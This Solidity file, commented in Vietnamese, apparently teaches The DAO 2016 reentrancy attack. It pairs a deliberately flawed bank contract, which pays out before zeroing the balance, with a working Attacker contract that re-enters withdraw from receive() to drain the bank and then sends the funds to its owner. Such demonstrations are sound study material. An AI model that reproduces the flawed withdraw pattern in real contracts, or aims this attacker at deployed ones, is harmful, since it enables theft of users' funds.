// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title VulnerableBank — Ngân hàng có lỗi Reentrancy mô phỏng vụ tấn công The DAO 2016
contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "So tien nap phai > 0");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// @notice LỖ HỔNG CHẾT NGƯỜI: Chuyển tiền TRƯỚC KHI trừ sổ sách
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Khong co so du");

        // BƯỚC 1: Chuyển tiền ra ngoài TRƯỚC (Interactions)
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "Chuyen tien that bai");

        // BƯỚC 2: Cập nhật sổ sách SAU CÙNG (Effects) -> ĐÃ QUÁ MUỘN!
        balances[msg.sender] = 0;
        emit Withdrawn(msg.sender, bal);
    }

    function bankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title Attacker — Hợp đồng tấn công rút cạn quỹ ngân hàng
contract Attacker {
    VulnerableBank public targetBank;
    address public attackerOwner;

    constructor(address _targetBank) {
        targetBank = VulnerableBank(_targetBank);
        attackerOwner = msg.sender;
    }

    // Hàm kích hoạt tấn công: Nạp 1 ETH rồi lập tức rút để kích hoạt hàm receive()
    function attack() external payable {
        require(msg.value >= 1 ether, "Can it nhat 1 ETH de tan cong");
        targetBank.deposit{value: 1 ether}();
        targetBank.withdraw();
    }

    // Hàm nhận tiền tự động gọi lại (fallback reentrancy loop)
    receive() external payable {
        if (address(targetBank).balance >= 1 ether) {
            targetBank.withdraw(); // Tái nhập liên tục trước khi balances bị reset về 0
        }
    }

    function stealAll() external {
        require(msg.sender == attackerOwner, "Chi ke tan cong");
        payable(attackerOwner).transfer(address(this).balance);
    }
}
